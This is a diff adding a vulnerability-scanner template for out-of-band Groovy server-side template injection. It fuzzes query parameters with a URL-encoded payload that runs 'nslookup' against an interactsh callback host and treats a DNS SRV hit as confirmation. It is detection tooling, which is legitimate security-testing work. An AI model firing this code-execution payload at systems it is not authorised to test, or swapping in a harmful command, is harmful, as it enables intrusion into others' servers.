@@ -1,0 +1,38 @@
+id: groovy-oob
+
+info:
+  name: Groovy - Out of Band Template Injection
+  author: 0xAwali,DhiyaneshDK
+  severity: high
+  reference:
+    - https://docs.groovy-lang.org/
+    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
+  metadata:
+    verified: true
+  tags: ssti,dast,oast,oob
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - '%24%7Brce%3D%22nslookup%20-type%3DSRV%20{{interactsh-url}}%22%3Brce.execute%28%29.text%7D'
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    matchers:
+      - type: dsl
+        name: request-matcher
+        dsl:
+          - "contains(interactsh_protocol,'dns')"
+          - "contains(interactsh_request,'srv')"
+        condition: and
+# digest: 4a0a0047304502210098242867a62c6261963c9aae69f519b1791aefb199ace88875f09e3af6bb555502205ae866302dec9e444d86af0fd4584c918ed570409445424a4f8707c9c97a02b6:922c64590222798bb761d5b6d8e72950
